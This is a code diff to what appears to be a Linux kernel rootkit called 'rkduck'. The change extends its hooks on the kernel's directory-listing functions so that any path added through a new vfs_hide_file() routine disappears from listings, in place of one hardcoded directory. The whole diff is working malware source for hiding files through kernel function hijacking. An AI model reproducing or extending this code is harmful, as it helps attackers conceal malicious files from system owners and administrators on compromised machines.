@@ -58,11 +58,19 @@ void *vfs_get_iterate(const char *path) {
 
 static int vfs_hijacked_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
     char *get_protect = "rkduck_dir";
+    char *filename;
+    struct hidden_file *h_file;
 
-    dbg("rkduck:\n\tName: %s\n\tInode: %llu\n\td_type: %u\n\toffset: %lld\n", name, ino, d_type, offset);
+    dbg("rkduck:\n\tName -> %s\n\tInode -> %llu\n\td_type -> %u\n\toffset -> %lld\n", name, ino, d_type, offset);
 
-    if (strstr(name, get_protect)) {
-        return 0;
+    dbg("rkduck: Filenames\n");
+    list_for_each_entry(h_file, &hidden_files, list) {
+        filename = strrchr(h_file->path, '/') + 1;
+        dbg("rkduck: \t- %s\n", filename);
+
+        if (!strncmp(name, filename, strlen(name))) {
+            return 0;
+        }
     }
 
     return vfs_original_filldir(ctx, name, namelen, offset, ino, d_type);
@@ -72,6 +80,7 @@ int vfs_hijacked_iterate(struct file *file, struct dir_context *ctx) {
     int ret;
     int length;
     struct dentry de;
+    struct hidden_file *h_file;
     char *path_name = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
     char *path_name_tmp = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
 
@@ -81,24 +90,42 @@ int vfs_hijacked_iterate(struct file *file, struct dir_context *ctx) {
     de = *(file->f_path.dentry);
 
     do {
-        dbg("rkduck: parent file path %s\n", de.d_name.name);
+        dbg("rkduck: Parent file path -> %s\n", de.d_name.name);
 
         length = strlen(de.d_name.name);
         strncpy(path_name_tmp+length+1, path_name, strlen(path_name));
-        strncpy(path_name_tmp+1, de.d_name.name, length);
-        strncpy(path_name_tmp, "/", 1);
+
+        if (de.d_name.name[0] != '/') {
+            strncpy(path_name_tmp+1, de.d_name.name, length);
+            path_name_tmp[0] = '/';
+        } else {
+            strncpy(path_name_tmp, de.d_name.name, length);
+        }
+
         strncpy(path_name, path_name_tmp, strlen(path_name_tmp));
         de = *(de.d_parent);
 
-        dbg("rkduck: path %s\n", path_name);
+        dbg("rkduck: Temp path -> %s\n", path_name);
     } while (strncmp(de.d_name.name, "/", 1));
 
-    strncpy(path_name+strlen(path_name), "/", 1);
-    dbg("rkduck: path %s\n", path_name);
+    length = strlen(path_name);
+
+    if (length < PATH_MAX && path_name[length-1] != '/') {
+        path_name[length] = '/';
+    } else if (length >= PATH_MAX) {
+        path_name[PATH_MAX-1] = '/';
+        path_name[PATH_MAX] = 0;
+    }
+
+    dbg("rkduck: Path %s\n", path_name);
     vfs_hijack_stop(vfs_original_iterate);
 
-    if (!strncmp(path_name, "/root/rkduck/rkduck/", strlen("/root/rkduck/rkduck/"))) {
-        *((filldir_t *)&ctx->actor) = &vfs_hijacked_filldir;
+    dbg("rkduck: Parent directory of file to hide -> %s\n", path_name);
+    list_for_each_entry(h_file, &hidden_files, list) {
+        dbg("rkduck: \t- %s\n", h_file->path);
+        if (!strncmp(path_name, h_file->path, strlen(path_name))) {
+            *((filldir_t *)&ctx->actor) = &vfs_hijacked_filldir;
+        }
     }
 
     ret = vfs_original_iterate(file, ctx);
@@ -122,12 +149,12 @@ void vfs_save_hijacked_function_code(void *target, void *new) {
     memcpy(original_code, target, CODE_SIZE);
 
     dbg("rkduck dump: hijacked code ");
-    for(i=0; i<CODE_SIZE; i++)
+    for (i=0; i<CODE_SIZE; i++)
         dbg("%02x", *((unsigned char *)hijacked_code+i) );
     dbg("\n");
 
     dbg("rkduck dump: original code ");
-    for(i=0; i<CODE_SIZE; i++)
+    for (i=0; i<CODE_SIZE; i++)
         dbg("%02x", *((unsigned char *)original_code+i) );
     dbg("\n");
 
@@ -137,4 +164,28 @@ void vfs_save_hijacked_function_code(void *target, void *new) {
     memcpy(h->original_code, original_code, CODE_SIZE);
 
     list_add(&h->list, &hooked_targets);
+}
+
+void vfs_hide_file(char *path) {
+    struct hidden_file *h_file;
+    int length;
+
+    h_file = kmalloc(sizeof(struct hidden_file), GFP_KERNEL);
+    h_file->path = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
+    memset(h_file->path, 0, PATH_MAX);
+    length = strlen(path);
+
+    if (length > PATH_MAX) {
+        length = PATH_MAX;
+    }
+
+    strncpy(h_file->path, path, length);
+
+    if (length > 1 && h_file->path[length-1] == '/') {
+        h_file->path[length-1] = 0;
+    }
+
+    list_add(&h_file->list, &hidden_files);
+
+    dbg("rkduck: Hide file -> %s\n", h_file->path);
 }
